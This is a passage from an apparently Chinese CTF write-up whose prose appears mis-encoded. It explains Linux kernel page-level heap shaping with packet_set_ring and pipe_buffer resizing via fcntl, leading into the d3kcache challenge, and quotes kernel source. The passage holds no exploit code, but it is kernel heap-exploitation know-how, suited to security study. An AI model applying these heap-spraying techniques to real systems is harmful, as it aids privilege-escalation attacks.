class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“æ³¨æ„åˆ°çš„æ˜¯éƒ½è°ƒç”¨çš„<code>packet_set_ring</code>å‡½æ•°ï¼Œè€Œåœ¨<code>packet_release</code>å‡½æ•°ä¸­æ‰€ç»™çš„å‚æ•°ä¸­ç¬¬ä¸‰ä¸ªå‚æ•°ä¸º1ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_set_ring</span><span class="params">(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> closing, <span class="keyword">int</span> tx_ring)</span></span></span><br></pre></td></tr></table></figure><p>å¯¹æ¯”å‡½æ•°å£°æ˜å¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªå‚æ•°å°±ä»£è¡¨è¦å…³é—­äº†ï¼Œå¹¶ä¸”åœ¨æ‰§è¡Œè¿™ä¸ªå‡½æ•°ä¹‹å‰<code>memset(&amp;req_u, 0, sizeof(req_u));</code>æ‰§è¡Œäº†è¿™æ ·ä¸€æ¡è¯­å¥ï¼Œä¹Ÿå°±å¯¼è‡´reqä¸­çš„æ‰€æœ‰å†…å®¹éƒ½ä¸º<code>\x00</code>ï¼Œä¹Ÿå°±ä¸è¿›å…¥åˆ†é…çš„åˆ†æ”¯ä¸­å»äº†ã€‚ä¸è¿‡ä¾æ—§ä¼šè¿›å…¥åˆ°è¿›è¡Œå„ç§swapçš„åˆ†æ”¯ï¼Œå› ä¸ºåœ¨åˆ†é…æ—¶èµ°è¿‡ä¸€æ¬¡ï¼Œæ‰€ä»¥è¿™æ¬¡æœ€åä¼šè°ƒç”¨åˆ°<code>free_pg_vec</code>å‡½æ•°äº†ï¼Œè€Œè¿™ä¸ªå‡½æ•°åœ¨è¿™é‡Œè¯´äº†å°±æ˜¯é‡Šæ”¾æ‰æ‰€æœ‰é¡µé¢ã€‚</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å½“æˆ‘ä»¬è€—å°½ buddy system ä¸­çš„ low order pages åï¼Œæˆ‘ä»¬å†è¯·æ±‚çš„é¡µé¢ä¾¿éƒ½æ˜¯ç‰©ç†è¿ç»­çš„ï¼Œå› æ­¤æ­¤æ—¶æˆ‘ä»¬å†è¿›è¡Œ <code>setsockopt()</code> ä¾¿ç›¸å½“äºè·å–åˆ°äº†ä¸€å—è¿‘ä¹ç‰©ç†è¿ç»­çš„å†…å­˜ï¼ˆä¸ºä»€ä¹ˆæ˜¯â€è¿‘ä¹è¿ç»­â€œæ˜¯å› ä¸ºå¤§é‡çš„ <code>setsockopt()</code> æµç¨‹ä¸­åŒæ ·ä¼šåˆ†é…å¤§é‡æˆ‘ä»¬ä¸éœ€è¦çš„ç»“æ„ä½“ï¼Œä»è€Œæ¶ˆè€— buddy system çš„éƒ¨åˆ†é¡µé¢ï¼‰ã€‚</p><p>æ‰€ä»¥è¿™é‡Œçš„ä½¿ç”¨æµç¨‹å°±æ˜¯ï¼Œå…ˆä½¿ç”¨ä¸Šè¿°åŠæ³•è¿›è¡Œå †å–·ã€‚</p><ol><li>  é‡Šæ”¾ä¸€éƒ¨åˆ†orderä¸º3çš„pageï¼Œæ¥ç€ä½¿ç”¨victim objectè¿›è¡Œç”³è¯·è¿™äº›é¡µé¢</li><li>  é‡Šæ”¾ä¸€ä¸ªé¡µé¢ï¼Œä½¿ç”¨vuln objectç”³è¯·è¿™ä¸€é¡µé¢</li><li>  é‡Šæ”¾ä¸€éƒ¨åˆ†orderä¸º3çš„pageï¼Œå†æ¬¡è®©victim objectç”³è¯·åˆ°</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/VvPk5nKYmDCWxOs.png"                      alt="å†å·"                ></p><p>æœ€ç»ˆå®ç°ä¸Šå›¾è¿™æ ·çš„æ•ˆæœã€‚</p><h2 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h2><p>åœ¨ä»¥å¾€çš„æ–‡ç« ä¸­å‡ºç°äº†å¾ˆå¤šæ¬¡çš„<code>pipe_buffer</code>ï¼Œä½†æ˜¯å¯æƒœçš„æ˜¯ä½¿ç”¨çš„æ–¹å¼è¿‡äºç®€å•ã€‚æ¯”å¦‚ï¼Œåªæ˜¯ç®€å•çš„åˆ©ç”¨ä»–çš„opsæŒ‡é’ˆè¿›è¡Œæ³„æ¼æˆ–è€…è¦†ç›–å®ƒæ§åˆ¶æ‰§è¡Œæµï¼Œå†å°±æ˜¯<code>Dirty Pipe</code>ä¸­çš„åˆ©ç”¨ã€‚å¯æ¨çš„æ˜¯æˆ‘åœ¨åšé¢˜çš„è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰æƒ³åˆ°ä½¿ç”¨<code>Dirty Pipe</code>ï¼Œå³ä¾¿æ˜¯å½“æ—¶æˆ‘å·²ç»å¯¹<code>pipe_buffer</code>æ‰€åœ¨çš„å †å—ä¸Šæœ‰ç»å¯¹çš„æƒé™äº†ã€‚æ‰€ä»¥è¿™é‡Œå°±ä¸å†åªæ˜¯å¯¹å…¶opsçš„åˆ©ç”¨äº†ï¼Œåé¢ä¸»è¦å°±æ˜¯ç ´åå…¶<code>page</code>æŒ‡é’ˆäº†ã€‚</p><h3 id="pipe-bufferåˆ†é…è¿‡ç¨‹"><a href="#pipe-bufferåˆ†é…è¿‡ç¨‹" class="headerlink" title="pipe_bufferåˆ†é…è¿‡ç¨‹"></a>pipe_bufferåˆ†é…è¿‡ç¨‹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_DEF_BUFFERS16</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct pipe_inode_info *<span class="title">alloc_pipe_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_bufs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">pipe = kzalloc(<span class="keyword">sizeof</span>(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))</span><br><span class="line">pipe_bufs = max_size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">user_bufs = account_pipe_buffers(user, <span class="number">0</span>, pipe_bufs);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (too_many_pipe_buffers_soft(user_bufs) &amp;&amp; pipe_is_unprivileged_user()) &#123;</span><br><span class="line">user_bufs = account_pipe_buffers(user, pipe_bufs, PIPE_MIN_DEF_BUFFERS);</span><br><span class="line">pipe_bufs = PIPE_MIN_DEF_BUFFERS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (too_many_pipe_buffers_hard(user_bufs) &amp;&amp; pipe_is_unprivileged_user())</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line"></span><br><span class="line">pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(struct pipe_buffer),</span><br><span class="line">     GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">pipe-&gt;user = user;</span><br><span class="line">mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line"><span class="keyword">return</span> pipe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">(<span class="keyword">void</span>) account_pipe_buffers(user, pipe_bufs, <span class="number">0</span>);</span><br><span class="line">kfree(pipe);</span><br><span class="line">out_free_uid:</span><br><span class="line">free_uid(user);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨åé¢ç”³è¯·<code>pipe-&gt;bufs</code>ä½¿ç”¨äº†<code>kcalloc</code>å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°åˆ†é…çš„æ•°é‡ï¼Œç¬¬äºŒå‚æ•°å°±æ˜¯æ¯ä¸€ä¸ªå•ä½çš„å¤§å°ã€‚å…¶å®åœ¨å…¶å†…éƒ¨ä¸­ä¹Ÿæ˜¯ä¼šå°†è¿™ä¸¤ä¸ªå‚æ•°ç›¸ä¹˜èµ·æ¥çš„ï¼Œè€Œè¿™ä¸¤ä¸ªå€¼å…¶å®éƒ½æ˜¯å·²çŸ¥çš„ï¼Œç¬¬ä¸€ä¸ªä¸º16ï¼Œç¬¬äºŒä¸ªä¸º40ï¼Œé‚£ä¹ˆä»–ä»¬çš„ç»“æœå°±æ˜¯640ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *<span class="title">kmalloc_slab</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">192</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!size)</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">index = size_index[size_index_elem(size)];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">index = fls(size - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> kmalloc_caches[kmalloc_type(flags)][index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>kcalloc</code>å‡½æ•°ä¸­ä¼šåˆ°è¿™é‡Œè¿›è¡Œé€‰æ‹©cache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123;</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">96</span>, <span class="number">96</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">192</span>, <span class="number">192</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8</span>, <span class="number">8</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16</span>, <span class="number">16</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32</span>, <span class="number">32</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">64</span>, <span class="number">64</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">128</span>, <span class="number">128</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">256</span>, <span class="number">256</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">512</span>, <span class="number">512</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1024</span>, <span class="number">1</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2048</span>, <span class="number">2</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">4096</span>, <span class="number">4</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8192</span>, <span class="number">8</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16384</span>, <span class="number">16</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32768</span>, <span class="number">32</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">65536</span>, <span class="number">64</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">131072</span>, <span class="number">128</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">262144</span>, <span class="number">256</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">524288</span>, <span class="number">512</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1048576</span>, <span class="number">1</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2097152</span>, <span class="number">2</span>M)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾è¿™é‡Œé€‰æ‹©çš„æ˜¯<code>kmalloc-cg-1k</code>ã€‚ç„¶è€Œï¼Œ<code>kmalloc-cg-1k</code>æ¥è‡ªäº<code>order</code>ä¸º2çš„é¡µé¢ã€‚ä½†æ˜¯æ ¹æ®å‰é¢çš„æ„æ€æˆ‘ä»¬éœ€è¦<code>order</code>ä¸º3çš„é¡µé¢å‡ºæ¥çš„ï¼Œæ‰€ä»¥å¦‚æœè¿™é‡Œç”³è¯·çš„é¡µé¢<code>order</code>ä¸º2çš„è¯æˆåŠŸç‡ä¼šå¤§æ‰“æŠ˜æ‰£ã€‚</p><h3 id="pipe-bufferä¿®æ”¹åˆ†é…å¤§å°"><a href="#pipe-bufferä¿®æ”¹åˆ†é…å¤§å°" class="headerlink" title="pipe_bufferä¿®æ”¹åˆ†é…å¤§å°"></a>pipe_bufferä¿®æ”¹åˆ†é…å¤§å°</h3><p>pipeç»™äººçš„æƒŠå–œæ˜¯ä¸æ–­çš„ï¼Œpipeå¯ä»¥æä¾›äº†<code>fcntl(F_SETPIPE_SZ)</code>è°ƒç”¨å»ä¿®æ”¹æ¯ä¸ªpipeä¸­<code>pipe_buffer</code>çš„æ•°é‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">pipe_set_size</span><span class="params">(struct pipe_inode_info *pipe, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_bufs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nr_slots, size;</span><br><span class="line"><span class="keyword">long</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue)</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  </span><br><span class="line">  size = round_pipe_size(arg);</span><br><span class="line">nr_slots = size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_slots)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">ret = pipe_resize_ring(pipe, nr_slots);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line"></span><br><span class="line">pipe-&gt;max_usage = nr_slots;</span><br><span class="line">pipe-&gt;nr_accounted = nr_slots;</span><br><span class="line"><span class="keyword">return</span> pipe-&gt;max_usage * PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">(<span class="keyword">void</span>) account_pipe_buffers(pipe-&gt;user, nr_slots, pipe-&gt;nr_accounted);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¸­ä¼šè°ƒç”¨åˆ°<code>pipe_resize_ring</code>å‡½æ•°ï¼Œè¿™é‡Œä¼šæ ¹æ®sizeå¾—åˆ°<code>nr_slots</code>ï¼Œè€Œåœ¨è°ƒç”¨<code>pipe_resize_ring</code>å‡½æ•°æ—¶<code>nr_slots</code>ä¸ºç¬¬äºŒä¸ªå‚æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pipe_resize_ring</span><span class="params">(struct pipe_inode_info *pipe, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_slots)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> head, tail, mask, n;</span><br><span class="line"></span><br><span class="line">bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!bufs))</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">tail = pipe-&gt;tail;</span><br><span class="line"></span><br><span class="line">n = pipe_occupancy(head, tail);</span><br><span class="line"><span class="keyword">if</span> (nr_slots &lt; n) &#123;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">kfree(bufs);</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ³¨æ„åˆ°çš„æ˜¯åœ¨è¿™ä¸ªå‡½æ•°å¼€å¤´çš„ä½ç½®å°±è°ƒç”¨äº†<code>kcalloc</code>å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>fcntl</code>è°ƒç”¨ä¿®æ”¹çš„ã€‚å¦‚æœï¼Œ<code>nr_slots</code>çš„å€¼ä¸º64ï¼Œé‚£ä¹ˆç”³è¯·çš„sizeå³ä¸º<code>0xa00</code>åˆ™ä¼šç”³è¯·<code>kmalloc-4k</code>ï¼Œæ­¤æ—¶<code>order</code>ä¸º3ï¼Œå¯ä»¥å¤§å¤§æé«˜æˆåŠŸç‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">calculate_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nr_cpus;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to find best configuration for a slab. This</span></span><br><span class="line"><span class="comment"> * works by first attempting to generate a layout with</span></span><br><span class="line"><span class="comment"> * the best configuration and backing off gradually.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * First we increase the acceptable waste in a slab. Then</span></span><br><span class="line"><span class="comment"> * we reduce the minimum objects required in a slab.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">min_objects = slub_min_objects;</span><br><span class="line"><span class="keyword">if</span> (!min_objects) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Some architectures will only update present cpus when</span></span><br><span class="line"><span class="comment"> * onlining them, so don&#x27;t trust the number if it&#x27;s just 1. But</span></span><br><span class="line"><span class="comment"> * we also don&#x27;t want to use nr_cpu_ids always, as on some other</span></span><br><span class="line"><span class="comment"> * architectures, there can be many possible cpus, but never</span></span><br><span class="line"><span class="comment"> * onlined. Here we compromise between trying to avoid too high</span></span><br><span class="line"><span class="comment"> * order on systems that appear larger than they are, and too</span></span><br><span class="line"><span class="comment"> * low order on systems that appear smaller than they are.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">nr_cpus = num_present_cpus();</span><br><span class="line"><span class="keyword">if</span> (nr_cpus &lt;= <span class="number">1</span>)</span><br><span class="line">nr_cpus = nr_cpu_ids;</span><br><span class="line">min_objects = <span class="number">4</span> * (fls(nr_cpus) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">max_objects = order_objects(slub_max_order, size);</span><br><span class="line">min_objects = min(min_objects, max_objects);</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯èƒ½å„ä½ä¼šç–‘æƒ‘ä¸ºä»€ä¹ˆ<code>kmalloc-4k</code>çš„<code>order</code>ä¸º3ï¼Œè¿™é‡Œé‡æ–°çœ‹<code>calculate_order</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°åœ¨å¯¹<code>min_objects</code>å˜é‡èµ‹å€¼çš„æœ€åä¸€ä¸ªæ“ä½œå°±æ˜¯é€‰å–æœ€å°çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">order_objects</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)PAGE_SIZE &lt;&lt; order) / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ<code>order_objects</code>å‡½æ•°å†…éƒ¨æ˜¯è¿™æ ·çš„ï¼Œå¹¶ä¸”æ­¤æ—¶<code>slub_max_order</code>çš„å€¼ä¸º3ï¼Œæ‰€ä»¥å½“sizeä¸º4kæ—¶ä¹Ÿå°±æ˜¯<code>0x1000</code>æ—¶<code>max_objects</code>çš„å€¼ä¸º0x8ï¼Œæ‰€ä»¥æŒ‰ç…§è¿™æ ·è®¡ç®—çš„è¯åç»­æ±‚å¾—çš„<code>order</code>ä¸º3ã€‚</p><h2 id="d3kcache"><a href="#d3kcache" class="headerlink" title="d3kcache"></a>d3kcache</h2><p>å‰é¢é“ºå«äº†è¿™ä¹ˆå¤šç»ˆäºåˆ°äº†é¢˜ç›®äº†ï¼Œå¦‚æœæœ‰äº†å‰é¢æåˆ°çš„æ‰€æœ‰åŸºç¡€ç†è®ºçŸ¥è¯†å†æ¥çœ‹è¿™é“é¢˜çš„è¯ï¼Œ<del>ä¾æ—§æ— æ³•å¾ˆè½»æ¾çš„å®Œæˆ</del>ã€‚</p><p>é¢˜ç›®åœ¨å¼€äº†åŸºæœ¬çš„ä¿æŠ¤ä¹‹å¤–è¿˜å¼€å¯äº†å¾ˆå¤šçš„ç¼–è¯‘é€‰é¡¹ä¸­çš„ä¿æŠ¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=<span class="string">&quot;&quot;</span></span><br><span class="line">CONFIG_SLUB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span 